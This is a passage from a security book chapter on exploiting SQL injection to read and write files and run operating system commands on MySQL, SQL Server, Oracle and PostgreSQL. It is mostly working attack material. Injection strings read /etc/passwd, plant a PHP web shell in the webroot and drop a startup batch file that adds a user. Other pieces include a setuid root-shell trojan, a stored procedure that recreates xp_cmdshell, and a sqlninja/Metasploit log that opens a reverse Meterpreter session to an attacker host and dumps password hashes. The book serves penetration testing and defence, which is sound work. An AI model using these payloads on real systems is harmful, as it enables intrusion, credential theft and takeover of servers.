this CLR integration later, but for now our focus is simply on \nabusing the remote system to read in files. This becomes possible through one of t he methods \nused to import assemblies into SQL Server. The first problem we need to overcome is that \nSQL Server 2005 disables CLR integration by default. As Figure 6.12 shows, this proves to be \nno problem once you have  system administrator  or equivalent privileges, since you can turn on \nall of this functionality again through the sp_configure  stored procedure.  \n \nFigure 6.12  Enabling CLR Integration  \nOf course (as you can see in Figure 6.13 ), it’s just as easy to adapt all of these to run through \nour injection string.  \n \n\nFigure 6.13  Enabling CLR Integration Through an Application  \nThis positions us to load any .NET binary from the remote server into the database by using \nthe CREATE ASSEMBLY  function. \nWe’ll load the .NET assembly c: \\temp \\test.exe with the following injection string:  \nsname=’;create assembly sqb from ‘c:\\ temp\\test.exe’ with permission_set = unsafe--  \nSQL Server stores the raw binary (as a HEX stri ng) in the sys.assembly_files  table. As \nshown in Figure 6.14, you can view this easily within Query Analyzer.  \n \nFigure 6.14  Viewing the Attached File Within the Database  \nViewing this file through our Web page requires that we combine the substring()  and \nmaster.dbo.fn_varbintohexstr()  functions:  \nsname=’ union select NULL,NUL L,NULL, master.dbo.fn_varbintohexstr (substring(content,1,5)) \nfrom sys.assembly_files -- \nFigure 6.15 shows how you can use the union, substring, and fn_varbintohexstr  combination \nto read binary files through the browser.  \n \nFigure 6.15  Reading Binary Files Using fn_varbintohex str and substring  \n\nSQL Server verifies the binary or assembly at load time (and at runtime) to ensure that the \nassembly is a valid .NET assembly. This prevents us from using the CREATE ASSEMBLY  \ndirective to place non- CLR binaries into the database:  \nCREATE ASSEMBLY sqb2 from ‘c:\\ temp\\test.txt’  \nThe preceding line of code results in the following:  \nCREATE ASSEMBLY for assembly ‘sqb2’ failed because assembly ‘sqb2’ is malformed or not a \npure .NET assembly.  \nUnverifiable PE Header/native stub.  \nFortunately, we can b ypass this restriction with a little bit of finesse. First we’ll load a valid \n.NET binary, and then use the ALTER ASSEMBLY  command to add additional files to the \nASSEMBLY . At the time of this writing, the additional files are inserted into the database with \nno type checking, allowing us to link arbitrary binary files (or plain- text ASCII ones) to the \noriginal assembly:  \ncreate assembly sqb from ‘c:\\ temp\\test.exe’  \nalter assembly sqb add file from ‘c:\\ windows\\ system32\\ net.exe’  \nalter assembly sqb add file from ‘c:\\ temp\\test.txt’  \nA select on the sys.assembly_files  table reveals that the files have been added and can be \nretrieved using the same substring/varbintohexstr  technique.  \nAdding assemblies to the system catalog is normally allowed only for members of the \nSYSADMIN group (and database owners). The first step toward utilizing these techniques will \nbe to elevate to the system administrator privilege level.  \nLater in this chapter, we will discuss executing commands through SQL Ser ver, but for now, \nkeep in mind that almost any command execution can be translated fairly easily to remote file reading through many of the same channels you use through the database.  \nOracle  \nOracle offers various possibilities to read files from the underl ying operating system. Most of \nthem require the ability to run PL/SQL codes. There are three different (known) interfaces to \naccess files:  \n• utl_file_dir /Oracle directories  \n• Java \n• Oracle Text  \nBy default, an unprivileged user cannot read (or write) files at the operating system level. \nWith the right privileges this will be an easy job.  \nUsing utl_file_dir  and Oracle directories is the most common way to access files. The \nutl_file_dir  database parameter (deprecated since Oracle 9i Rel. 2) allows you to speci fy a \ndirectory on an operating system level. Any database user can read/write/copy files inside this \ndirectory ( check: select name,value from v$parameter where name=‘UTL_FILE_DIR’ ). If the \nvalue of utl_file_dir  is ∗, there are no limitations regarding wher e the database process can \nwrite. Older unpatched versions of Oracle had directory traversal problems which made this considerably easier.  \nThe following methods allow you to read files from the Oracle database using \nutl_file_dir /Oracle directories:  \n• UTL_F ILE (PL/SQL, Oracle 8 through 11g)  \n• DBMS_LOB  (PL/SQL, Oracle 8 through 11g)  \n• External tables (SQL, Oracle 9i Rel. 2 through 11g)  \n• XMLType  (SQL, Oracle 9i Rel. 2 through 11g)  \nThe following sample PL/SQL code reads 1000 bytes, beginning at byte 1, from the rds.txt \nfile. This file is located in the MEDIA_DIR directory:  \nDECLARE  \nbuf varchar2(4096);  \nBEGIN  \nLob_loc:= BFILENAME(‘MEDIA_DIR’, ‘rds.txt’);  \nDBMS_LOB.OPEN (Lob_loc, DBMS_LOB.LOB_READONLY);  \nDBMS_LOB.READ (Lob_loc, 1000, 1, buf);  \ndbms_output.put_line(utl_raw.cast_to_varchar2(buf));  \nDBMS_LOB.CLOSE (Lob_loc);  \nEND; \nSince Oracle 9i Rel. 2, Oracle offers the ability to read files via external tables. Oracle uses \nthe SQL∗Loader or Oracle Datapump (since 10g) to read data from a structured file. If an SQL \ninjection vulnerability exists in a CREATE TABLE statement, it’s p ossible to modify the \nnormal table to an external table.  \nHere is the sample code for an external table:  \ncreate directory ext as ‘C:\\ ’; \nCREATE TABLE ext_tab (  \nline varchar2(256))  \nORGANIZATION EXTERNAL (TYPE oracle_loader  \nDEFAULT DIRECTORY extACCESS PARAMETERS (  \nRECORDS DELIMITED BY NEWLINE  \nBADFILE ‘bad_data.bad’  \nLOGFILE ‘log_data.log’  \nFIELDS TERMINATED BY ‘,’  \nMISSING FIELD VALUES ARE NULL  \nREJECT ROWS WITH ALL NULL FIELDS  \n(line))  \nLOCATION (‘victim.txt’)  \n) \nPARALLEL  \nREJECT LIMIT 0  \nNOMONITORING;  \nSelect ∗ from ext_tab;  \nThe next code snippet reads the username, clear -text password, and connect string from the \ndata- sources.xml file. This is a default file (in Oracle 11g) and it contains a connect string for \nJava. The big advantage of this code is the fact that you c an use it inside select  statements in a \nfunction or as a UNION SELECT : \nselectextractvalue(value(c), ‘/connection- factory/@user’)||‘/’||extractvalue(value(c), \n‘/connection- factory/@password’)||‘@’||substr(extractvalue(value(c), ‘/connection-\nfactory/@url’),instr(extractvalue(value(c), ‘/connection- factory/@url’),‘//’)+2) conn  \nFROM table(XMLSequence(extract(xmltype(bfilename(‘GETPWDIR’, ‘data -sources.xml’),  \nnls_charset_id(‘WE8ISO8859P1’)  \n), \n‘/data-sources/connection- pool/connection- factory’  \n) \n) \n) c \n/ \nInstead of using the utl_file_dir /Oracle directory concept, it is also possible to read and write \nfiles using Java. You can find sample code for this approach on Marco Ivaldis’s Web site, at \nwww.0xdeadbeef.info/exploits/raptor_oraexec.sql . \nA widely unknown technique for reading files and URIs is Oracle Text. This feature does \nnot require Java or utl_file_dir /Oracle directories. Just insert the file or URL you want to read \ninto a table, and create a full text index or wait until the full text index is created. The index \ncontains the contents of the entire file.  \nThe following sample code shows how to read the boot.ini file by inserting it into a table: \nCREATE TABLE files (id NUMBER PRIMARY KEY,  \npath VARCHAR(255) UNIQUE,  \not_format VARCHAR(6)  \n); \nINSERT INTO files VALUES (1, ‘c:\\ boot.ini’, NULL);  \nCREATE INDEX file_index ON files(path) INDEXTYPE IS ctxsys.contextPAR AMETERS (‘datastore \nctxsys.file_datastore format column ot_format’);  \n-- retrieve data from the fulltext index  \nSelect token_text from dr$file_index$i;  \nPostgreSQL  \nPostgreSQL offers a built -in COPY function that allows text files to be copied into the text \nfields of a table. The files copied using the COPY function should either be world readable or \nshould be owned by the user who is running the PostgreSQL process (usually the postgres user). The following example demonstrates how an attacker reads the content s of the file \n‘/etc/passwd’:  \n• Creating a temporary table: \nhttp://10.10.10.114/test.php?id=1;CREATE table temp (name text);--  \n• Copy the file into the table: \nhttp://10.10.10.114/test.php?id=1; copy temp from ‘/etc/passwd’--  \n• Read the table  \nOnce the file h as been copied to the table, the table can be read using other SQL injection \ntechniques, such as union techniques or the blind techniques (see Figure 6.16):  \nhttp://10.10.10.114/test.php?id=1 union select 2,name from temp--  \n \nFigure 6.16  Reading the ‘/etc/passwd’ File on the Database Host  \nWriting Files  \nWriting files to the remote server is sometimes a bit of a throwback to the old days when an \nattacker would drop a text file on the remote host to prove that he “captured his flag.” Indeed, when so much value resides in the database itself, it sometimes  seems strange to see people \nobsessed about breaking out of the database. Writing files does, however, have its uses, and often it serves as the springboard toward compromising the host itself (which in turn serves as the beachhead for attacking the internal network).  \nAll of the common RDBMSs have built -in functionality for writing files to the server file \nsystem. These can be abused within SQL injection attacks to a lesser or greater degree depending on the family type of the underlying system. \nMySQL  \nThe MySQ L LOAD DATA INFILE file-reading command demonstrated earlier has its perfect \ncounterpart in the file -writing world in the form of the select into outfile (dumpfile)  command. \nThis command allows the results of a select  statement to be written to a world -readable file \n\nowned by the owner of the MySQL process ( dumpfile  allows for binary file writing). For \nexample:  \nmysql> select ‘This is a test’ into outfile ‘/tmp/test.txt’;  \nQuery OK, 1 row affected (0.00 sec)  \nThis creates ( as expected) the following test.txt file in the /tmp directory:  \n$ cat test.txt  \nThis is a test  \nDoing this via an injection is fairly trivial. In Figure 6.17, we go back to our intranet \nMySQL application, and this time we try to write SensePost 2008 to the /tmp/sp.txt file.  \n \nFigure 6.17  Writing a File Using into DUMPFILE  \nWe u se the following search string:  \naaa’ union select NULL,‘SensePost 2008 \\n’ into dumpfile ‘/tmp/sp.txt’#  \nWe first use the search term aaa because we don’t want actual results to be returned and \nmess up our outfile. We then use NULL  to match the number of col umns for the union to work. \nWe use dumpfile  (allowing a binary file to be output) instead of outfile , so we have to supply \nthe \\n we need for the line to be terminated as normal.  \nAs expected, this creates sp.txt file in the /tmp directory:  \n\n$ cat sp.txt  \nSensePost 2008  \nWhen reading binary files from the file system we used MySQL’s built -in HEX  function, so \nit makes perfect sense that when trying to write binary to the file system we would do the \nreverse. We therefore use the MySQL built -in function, UNHEX() : \nmysql> select UNHEX(‘53656E7365506F7374203038’);  \n+-----------------------------------+  \n| UNHEX(‘53656E7365506F7374203038’)|  \n+-----------------------------------+  \n| SensePost 08|  \n+-----------------------------------+  \n1 row in set (0.00 sec)  \nWith this combination, we are effectively primed to write any kind of file, anywhere on the \nfile system [without the ability to overwrite existing files (and keeping in mind that the file will be world- writable)]. Before a brief discussion on what you can do with the ability to write any \nfile anywhere, it is probably worth it to see what happened to www.apache.org  when attackers \ngave themselves the same capability . \nNotes from the underground…  \nHow We Defaced apache.org  \nIn May 2000, the main Web page of the Apache Foundation (maker of the Apache Web Server) was subtly \ndefaced to house the “Powered by Microsoft BackOffice” logo. The pranksters, { } and Hardbeat, documented \ntheir attack at www.dataloss.net/papers/how.defaced.apache.org.txt  in a paper titled “How we defaced \nhttp://www.apache.org .” \nThe pair first obtained access by ab using an ftpd configuration error and then uploading a crude Web shell to \nthe Web server root. This allowed them to have a low -privileged shell running as the user nobody . They then went \non to say:  \n“After a long search we found out that mysql was running a s user root and was reachable locally. Because \napache.org  was running bugzilla which requires a mysql account and has it username/password plaintext in the \nbugzilla source it was easy to get a username/passwd for the mysql database.” \n(Note: Some details deleted for brevity.)  \n“Having gained access to port 3306 com ing from localhost, using the login ‘bugs’ (which had full access [as in \n“all Y’s”]), our privs were elevated substantially. This was mostly due to sloppy reading of the BugZilla \nREADME which _does_ show a quick way to set things up (with all Y’s) but also has lots of security warnings, \nincluding “don’t run mysqld as root.”  \n“Using ‘SELECT … INTO OUTFILE;’ we were now able to create files anywhere, as root. These files were \nmode 666, and we could not overwrite anything. Still, this seemed useful.  \n“But what d o you do with this ability? No use writing .rhosts files —no sane rshd will accept a world -writable \n.rhosts file. Besides, rshd was not running on this box.  \n/∗ \n∗ our /root/.tcshrc  \n∗/ \n“Therefore, we decided to perform a trojan -like trick. We used database ‘t est’ and created a one- column table \nwith a 80char textfield. A couple of inserts and one select later, we had ourselves a /root/.tcshrc with contents \nsimilar to: \n#!/bin/sh  \ncp /bin/sh /tmp/.rootsh  \nchmod 4755 /tmp/.rootsh  \nrm -f /root/.tcshrc  \n/∗ \n∗ ROOT!!  \n∗/ \n“Quite trivial. Now the wait was for somebody to su - . Luckily, with nine people legally having root, this \ndidn’t take long. The rest is trivial too —being root the deface was quickly done, but not until after a short report \nlisting the vulnerabilities and quick fixes was built. Shortly after the deface, we sent this report to one of the \nadmins.”  \n(Note: Some details deleted for brevity.)  \n“We would like to compliment the Apache admin team on their swift response when they found out about the \ndeface, and also on their approach, even calling us ‘white hats’ (we were at the most ‘gray hats’ here, if you ask \nus). \nRegards,  \n{} and Hardbeat .” \nThe pranksters highlighted in the preceding sidebar did not use SQL injection, but \ndemo nstrated the possibilities available to attackers once they have access to the SQL server.  \nWith the ability to create files on the server, one other possibility bears discussing: the \nthought of creating a user -defined function (UDF) on the remote host. In his excellent paper \n“HackProofing MySQL,” NGS Software’s Chris Anley documented how to create a UDF to \neffectively create a MySQL xp_cmdshell  equivalent. Essentially, adding a UDF (according to \nthe MySQL manual) requires simply that your UDF is compiled as  an object file which is then \nadded and removed from the server using the CREATE FUNCTION  and DROP FUNCTION  \nstatements.  \nMicrosoft SQL Server  \nYou can use the aforementioned scripting.filesystem  object method of reading files just as \neffectively to write files to the file system. Anley’s paper again demonstrates the method shown in Figure 6.18.  \n \nFigure 6.18  Writing to the File System Using sp_oacreate  \nAlthough we used this technique for writing binary files too, it is reported that some code \npages may have errors with this technique. In such cases, you can use an object other than the \nfilesystemobject , such as ADODB.Str eam. \nMicrosoft SQL Server also provides the ability to create a file from a data source with the \nBulk Copy Program (BCP) which ships with SQL Server:  \nC:\\temp>bcp “select name from sysobjects” queryout testout.txt - c -S 127.0.0.1 - U sa -P”” \nStarting copy…  \n1000 rows successfully bulk- copied to host -file. Total received: 1000  \n1311 rows copied.  \nNetwork packet size (bytes): 4096  \nClock Time (ms.): total 16  \nMany of the historic documents on SQL injection attacks will use bcp  or xp_cmdshell  for \nfile creation. Many of the SQL injection tools use the well- known xp_cmdshell  procedure to \n\nfacilitate file uploads through SQL Server. In its simplest form, text files are created using the \n>> redirect operators:  \nexec xp_cmdshell ‘echo This is a test > c: \\temp\\test.txt’  \nexec xp_cmdshell ‘echo This is line 2 >> c:\\ temp\\test.txt’  \nexec xp_cmdshell ‘echo This is line 3 >> c:\\ temp\\test.txt’  \nAn old trick that sprung to fame without a discernable originator is to create a debug.exe \nscript file which can be passed to debug.exe to  convert into a binary:  \nC:\\temp>debug < demo.scr  \n-n demo.com  \n-e 0000 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  \n-e 0010 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  \n-e 0040 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  \n-e 0050 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F  \n-e 0060 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  \n-e 0070 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00  \n… \n-rcx \nCX 0000  \n:4200  \n-w 0 \nWriting 04200 bytes  \n-q \nC:\\temp>dir demo∗  \n2008/12/27 03:18p 16,896 demo.com  \n2005/11/21 11:08a 61,280 demo.scr  \nOne of the limitations of using this method is that debug.exe can only build executables \nsmaller than 64  KB in size. This does not prove to be a huge hindrance  when you ponder that a \nfully working bind shell can be squeeze d into fewer than 200 bytes. However, if you really \nneed to use this technique to upload a larger file, you can split it into chunks, each one 64 KB \nbytes long, separately upload them, and “glue” them together with the DOS copy  command:  \ncopy /b chunk- 1.exe_ + chunk- 2.exe_ + … + chunk -n.exe original -file.exe  \nIf you were building the executable using debug, you would probably have combined it with \nthe copy  command anyway, since debug.exe is built to build .com files. Most automated tools \nsimply rename the created .com file to .exe after it has been built.  \nNotes from the underground…  \nSQL Injection Worms  \nIn 2008, at the Black Hat Conference in Las Vegas, this book’s lead author, Justin Clarke, demonstrated a proof -\nof-concept SQL injection worm that utilized many of the techniques listed in this chapter. In addition, it utilized a \nsimple scanning engine to detect and exploit Web sites with a Microsoft SQL Server back end running in an \ninsecure configuration (i.e. no privilege escalation was necessary to execute xp_cmdshell ). \nThe worm utilized the debug.exe uploading technique described earlier to upload a co py of itself to the DBMS, \nand to then execute the remote instance (using xp_cmdshell ) of the worm to continue to spread.  \nAlthough this was a proof -of-concept, it is entirely possible for a vulnerability such as SQL injection to be \nused in this way as part of a hybrid attack by utilizing SQL injection and the techniques outlined in this chapter —\nsay, for example, to install server operating system -level malware.  \nYou can find more details on the worm at www.gdssecurity.com/l/b/2008/08/21/overview -of-sql-injection -\nworms -for-fun-and-profit/ . \nA few tools allow you to upload executable files using debug.exe. If you use Windows, you \ncan try the Automagic SQL  Injector from Sec- 1 Ltd. ( www.sec -1.com ). It includes a helper \nscript to first convert a binary to its .scr equivalent, and then to facilitate the remote creation of \nthe .scr file through echo commands. Automagic also includes a courtesy reverse User Datagram Protocol (UDP) shell and a port scanner (fscan.exe).  \nOn the other hand, if your box has a UNIX -like operating system, you can use sqlninja \n(http://sqlninja.sourceforg e.net ) to do the job. We already met sqlninja when we talked about \nprivilege escalation in Chapter 4 , but this tool bundles several other functionalities as well. \nHere is list of its features: \n• Fingerprint of the remote database server (version, user performing the queries, privileges, \nand authentication mode). \n• Brute -force of the system administrator password, if mixed authentication is enabled.  \n• Upload of executables.  \n• Direct and reverse shell, both TCP - and UDP -based.  \n• DNS tunneled shell, when no direct connection is possible. \n• Evasion techniques, to reduce the chance of being detected by intrusion detection \nsystem/intrusion prevention system (IDS/IPS) and Web application firewalls. \nSqlninja also integrates with  Metasploit ( www.metasploit.com ). If you have obtained \nadministrative privileges on the remote database and there is at least one open TCP port that \nyou can use for a connection (either direct or reverse), you can exploit the SQL injection \nvulnerability to inject a Metasploit payload, such as Meterpreter (a sort of high -powered \ncommand -line interface), or a VNC dynamic link library (DLL) to obtain graphical access to \nthe remote database server! A flash demo of the V NC injection is available on the official \nsqlninja site, and in the following code snippet you can see an example of a successful exploitation that leads to the extraction of the password hashes of the remote server (the operating system ones, not the SQL Server one). I have reduced the output for brevity, and the comments are in bold at the right of the relevant lines:  \nroot@nightblade ∼ # ./sqlninja - m metasploit  \nSqlninja rel. 0.2.3- r1 \nCopyright (C) 2006 -2008 icesurfer <r00t@northernfortress.net>  \n[+] Parsing configuration file…………..  \n[+] Evasion technique(s):-  query hex- encoding  \n- comments as separator  \n[+] Target is: www.victim.com  \n[+] Which payload you want to use?1: Meterpreter  \n2: VNC  \n> 1 <--- we select the Meterpreter payload  \n[+] Which type of connection you want to use?1: bind_tcp  \n2: reverse_tcp  \n> 2 <--- we use a reverse shell on port 443  \n[+] Enter local port number  \n> 443  \n[+] Calling msfpayload3 to create the payload …  \nCreated by msfpayload  (http://www.metasploit.com ). \nPayload: windows/meterpreter/reverse_tcp  \nLength: 177  \nOptions: exitfunc=process,lport=12345,lhost=192.168.217.128  \n[+] Payload (met13322.exe) created. Now converting it to debug script  \n[+] Uploading /tmp/met13322.scr debug script…< --- we upload the payload  \n103/103 lines written  \ndone !  \n[+] Converting script to executable… might take a while  \n<snip>  \n[∗] Uploading DLL (81931 bytes)…  \n[∗] Upload completed.  \n[∗] Meterpreter session 1 opened  (www.attacker.com:12345- >www.victim.com:1343) <--- the \npayload was uploaded and started  \nmeterpreter > use priv < --- we load the priv extension of meterpreter  \nLoading extension priv…success.  \nmeterpreter > hashdump <--- and finally extract the hashes  \nAdministrator:500:aad3b435b51404eeafd3b435b51404ee:31d6cfe0d16ae938b73c 59d7e0c089c0:::  \nASPNET:1007:89a3b1d42d454211799cfd17ecee0570:e3200ed357d74e5d782ae8d60a296f52:::  \nGuest:501:aad3b435b51104eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d770c089c0:::  \nIUSR_VICTIM:1001:491c44543256d2c8c50be094a8ddd267:5681649752a67d765775f c6069b50920:::  \nIWAM_VICTIM:1002:c18ec1192d26469f857a45dda7dfae11:c3dab0ad3710e208b479e ca14aa43447:::  \nTsInternetUser:1000:03bd869c8694066f405a502d17e12a7c:73d8d060fedd690498 311bab5754c968:::  \nmeterpreter >  \nBingo! The preceding code would give you interactive access on the remote database server \nwith which you have extracted the operating system password hashes.  \nSQL Server 2005 CLR integration gives you a way to compile much more complex binaries \non the remot e system, but it also gives you the guarantee that the remote system has a .NET \nruntime and also, by default, will have a .NET compiler. (Microsoft bundles the csc.exe \ncommand -line compiler in the %windir% \\Microsoft.NET \\Framework \\VerXX\\  directory.) This \nmeans that using the same technique, you can create a source file line by line and call the \ncsc.exe compiler to build it for you with no restrictions, as demonstrated in Figure 6.19.  \n \nFigure 6.19  Compiling a Binary on SQL Server Using csc.exe  \nThe example in Figure 6.19 creates a simple . NET source file and then calls on csc.exe to \ncompile the file as a DLL in the c: \\temp directory on the SQL server.  Even if the remote server \nused a different directory naming scheme, an enterprising attacker would be able to use csc.exe \nby running it out of the perfectly predictable DLL cache, %windir% \\system32 \\dllcache \\csc.exe.  \nOracle  \nAgain, various possibilities exist to create files in Oracle. The following methods are available:  \n• UTL_FILE  \n• DBMS_ADVISOR  \n• DBMS_XSLPROCESSOR  \n• DBMS_XMLDOM  \n• External tabl es \n• Java \n• Operating system commands and redirection  \nSince Oracle 9i, utl_file  can write binary code on the file system. The following sample code \ncreates a binary file, hello.com, on the C: drive or the appropriate UNIX path of the database \nserver:  \nCreate or replace directory EXT AS ‘C: \\’; \nDECLARE fi UTL_FILE.FILE_TYPE;  \n\nbu RAW(32767);  \nBEGIN  \nbu:=hextoraw(‘BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C40 \n2CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E \n088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576F726C64210D0A’);  \nfi:=UTL_FILE.fopen(‘EXT’,‘hello.com’,‘w’,32767);  \nUTL_FILE.put_raw(fi,bu,TRUE);  \nUTL_FILE.fclose(fi);  \nEND; \n/ \nDBMS_ADVISOR  is probably the shortest way to create files:  \ncreate directory EXT as ‘C:\\ ’; \nexec SYS.DBMS_ADVISOR.CREATE_FILE (‘first row’, ‘EXT’, ‘victim.txt’);  \nSince Oracle 10g, it is possible to create a file containing all usernames plus their passwords \nusing external tables:  \ncreate directory EXT as ‘C:\\ ’; \nCREATE TABLE ext_write (  \nmyline)  \nORGANIZATION EXTERNAL  \n(TYPE oracle_datapump  \nDEFAULT DIRECTORY EXT  \nLOCATION (‘victim3.txt’))  \nPARALLEL  \nAS \nSELECT ‘I was here’ from dual UNION SELECT name||‘=’||password from sys.user$;  \nDBMS_XSLPROCESSOR allows you to write XML files to the filesystem: \nexec dbms_xslprocessor.clob2file(your_xml, ‘MYDIR’,‘outfile.txt’);  \nAlso DBMS_XM LDOM allows file system access:  \nCREATE OR REPLACE DIRECTORY XML_DIR AS ‘C: \\xmlfiles’;  \nexec DBMS_XMLDOM.writeToFile(doc,‘XML_DIR/outfile.xml’);  \nYou can find Java sample code on Marco Ivaldi’s Web page, at \nwww.0xdeadbeef.info/exploits/raptor_oraexec.sql . \nPostgreSQL  \nPostgreSQL supports writing files using the same built -in COPY function used for reading \nfiles, allowing the contents of a table to be written as text (one line per table row) to a file. \nFiles will be created as the user who is running the PostgreSQL process (usually the postgres  \nuser), and therefore this user will need write permissions to the path being written to. \nIt is very common to see PostgreSQL servers used with the PHP programing language, \nwhich allows nested queries to be issued on the back- end PostgreSQL server, and hence can \nmake creating a file through Web application SQL injection straight forward, providing the underlying database user has the required “super user” privileges as shown in the following \nexample:  \nCreate a temp table:  \nhttp://10.10.10.128/test.php?id=1; create table hack(data text);--  \nInsert PHP Webshell code into the table:  \nhttp://10.10.10.128/test.php?id=1; insert into hack(data) values (“<?php \npassthru($_GET[‘cmd’]); ?>”);--  \nCopy the data from the table into a file, placing the file within the Webroot: \nhttp://10.10.10.128/test.php?id=1; copy(select data from hack) to ‘/var/www/shell.php’;--  \nFor the above example to work the operating system  postgres  user must have write access to \nthe document root location, and the database and the Web server must be on the same system, \nhowever if these cases are true, this will allow us to execute operating system commands as the PHP user (usually nobody  on an Apache Web server) on the Web server.  \nBernardo Damele in his talk at Black Hat Europe in 2009 showed an alternate method by \nwhich an attacker can write files to remote database. PostgreSQL has native functions to deal with Large Objects: lo_create(), l o_export() and lo_unlink(). These functions have been \ndesigned to store large files within the database or reference local files via pointers, called OID, that can then be copied to other files on the file system. By abusing these functions it is possible to successfully write both text and binary files on the database host. The tool sqlmap \nsupports this feature to write files, as shown in the following example:  \n>sqlmap.py -u http://10.10.10.128/test.php?id=1 --file-write=“test.txt” --file-\ndest=“/tmp/txt”  \nsqlmap/1.0 -dev - automatic SQL injection and database takeover tool  \nhttp://www.sqlmap.org  \n[∗] starting at 13:04:22  \n… \n[13:04:22] [INFO] the back- end DBMS is PostgreSQL  \nweb server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)  \nweb application technology: PHP 5.2.6, Apache 2.2.9  \nback-end DBMS: PostgreSQL  \n[13:04:22] [INFO] fingerprinting the back- end DBMS operating system  \n[13:04:22] [WARNING] time- based comparison needs larger statistical model. Making a few \ndummy requests, please wait..  \n[13:04:22] [WARNING] it is very important not to stress the network adapter’s bandwidth \nduring usage of time- based queries  \n[13:04:22] [INFO] the back- end DBMS operating system is Linux  \n[13:04:22] [INFO] detecting back- end DBMS version from its banner  \ndo you want confirmation that the file ‘/tmp/txt’ has been successfully written on the back-\nend DBMS file system? [Y/n] y  \n[13:04:25] [INFO] the file has been successfully written and its size is 43 bytes, same size \nas the local file ‘test.txt’  \n[13:04:25] [INFO] Fetched data logged to text files under ‘F:\\ App\\sqlmap-\ndev\\output\\10.10.10.128’  \n[∗] shutting down at 13:04:25  \nExecuting operating system commands  \nExecuting commands through the database server serves multiple purposes. Other than the \nmassive amount of fam e and fortune that such activity attracts, command execution is \nnormally searched for because of the high level of privileges with which most database servers \nrun. A remote exploit against Apache will, at best, result in a shell with a user ID of nobody  \n(probably within a jailed environment), but the equivalent attack against a DBMS will almost \nalways yield higher levels of permission. On Windows, this has traditionally been the SYSTEM privilege.  \nThis section deals with executing operating system commands directly through SQL \ninjection by exploiting functionality built into the RDBMS.  \nMySQL  \nMySQL does not natively support the execution of shell commands. Most times the attacker hopes that the MySQL  server and Web server reside on the same box, allowing him to use the \n“select into DUMPFILE” technique to build a rogue Common Gateway Interface (CGI) on the target machine. The “create UDF” attack detailed by Chris Anley in “Hackproofing MySQL” is excell ent thinking, but it’s not easy to do through an SQL injection attack (again because \nyou cannot execute multiple queries separated by a command separator). Stacked queries are \npossible in MySQL 5 and later, but this has not been found in the wild very ofte n (yet). \nBernardo Damele in his talk at Black Hat Europe in 2009 showed that the use of ASP.NET is \none situation that allows stacked queries for MySQL databases. Other Web technologies using third party connectors to interact with databases could also allow stacked queries to be issued on the remote database. As these are uncommon occurrences it has not been covered in this book but readers interested in knowing more about this are encouraged to read the following paper:  \nhttp://sqlmap.sourceforge.net/doc/BlackHat -Europe-09-Damele-A-G-Advanced -SQL-injection -\nwhitepaper.pdf  \nWAMP Environments  \nUnder WAMP (Windows, Apache, MySQL, PHP) environments, MySQL will often be \nrunning as a privileged user (such as SYSTEM) and hence an attacker will be able to write files on the system at any location. This can be used to exploit passive code execution techniques, such as creating a Windows batch file in the Administrator’s start- up folder. When \nthe Administrator logs on the system, the attacker’s batch file will be executed and the attacker’s code will be executed on the box as the Administrator.  \nThe following example demonstrates this attack:  \nhttp://vulnsite/vuln.php?name=test’ union select ‘net user attacker pwd /add’ into outfile \n‘c:\\documents and settings\\ all users\\ start menu \\programs\\ startup\\ owned.bat’  \nMicrosoft SQL Server  \nOnce more, we can find the lion’s share of exploitation fun within Microsoft SQL Se rver. \nAttackers found the joy of xp_cmdshell  ages ago and it certainly revived interest in how much \ncan be done from the command line. xp_cmdshell  has intuitive  syntax, accepting a single \nparameter which is the command to be executed. The results of a simp le ipconfig command \nappear in Figure 6.20.  \n \nFigure 6.20  xp_cmdshell  Under Microsoft SQL Server  \nOn modern versions of SQL Server, however, xp_cmdshell  is disabled by default. This \n(along with many other settings) can be configured through the Surface Area Configuration \ntool that ships with SQL Server. The Surface Area Configuration tool is shown in Figure 6.21.  \n\n \nFigure 6.21  The Surface Area Configuration Tool  \nThis, however, poses little problem if the attacker has the necessary privileges, since it can \nonce more be turned on through in- band signaling using the sp_configure  statement.  \nFigure 6.22 demonstrates how to re -enable xp_cmdshell  within Query Manager. A quick \nsearch on the Internet for “xp_cmdshell alternativ e” will also quickly point you to the hordes \nof posts where people have rediscovered the possibility of instantiating a Wscript.Shell  \ninstance through T -SQL in much the same manner as we used  in this chapter for file reading \nand writing. The neatest of the se, demonstrated in the code that follows, creates a new stored \nprocedure called xp_cmdshell3 ( Foller ). \nCREATE PROCEDURE xp_cmdshell3(@cmd varchar(255), @Wait int = 0) AS--Create WScript.Shell \nobject  \nDECLARE @result int, @OLEResult int, @RunResult int  \nDECLARE @ShellID int  \nEXECUTE @OLEResult = sp_OACreate ‘WScript.Shell’, @ShellID OUT  \n\nIF @OLEResult <> 0 SELECT @result = @OLEResult  \nIF @OLEResult <> 0 RAISERROR (‘CreateObject%0X’, 14, 1, @OLEResult)  \nEXECUTE @OLEResult = sp_OAMethod @ShellID, ‘Run’, Null, @cmd, 0, @Wait  \nIF @OLEResult <> 0 SELECT @result = @OLEResult  \nIF @OLEResult <> 0 RAISERROR (‘Run%0X’, 14, 1, @OLEResult)  \n--If @OLEResult <> 0 EXEC sp_displayoaerrorinfo @ShellID, @OLEResult  \nEXECUTE @OLEResult = sp_OADestroy @ShellID  \nreturn @result  \n \nFigure 6.22  Reenabling xp_cmdshell  Through an SQL  Query \nSQL Server 2005, and later also present a few new options for code execution, thanks once \nmore to integration with the .NET CLR. This functionality, as mentioned earlier, is turned off \nby default but can be re -enabled through a good SQL injection st ring and the right permissions. \nEarlier in the chapter, we used the CREATE ASSEMBLY  directives to get SQL Server to \nload a file from the system. If you want to use this functionality to load a valid .NET binary, you would once more have three options:  \n• Create and load the executable locally:  \n1. Create the source file on the system.  \n2. Compile the source file to an executable.  \n3. Call CREATE ASSEMBLY FOO  from C: \\temp \\foo.dll. \n\n• Load the executable from a UNC share:  \n1. Create the DLL (or EXE) on a publicly a ccessible Windows share.  \n2. Call CREATE ASSEMBLY FOO  from \\\\public_server \\temp 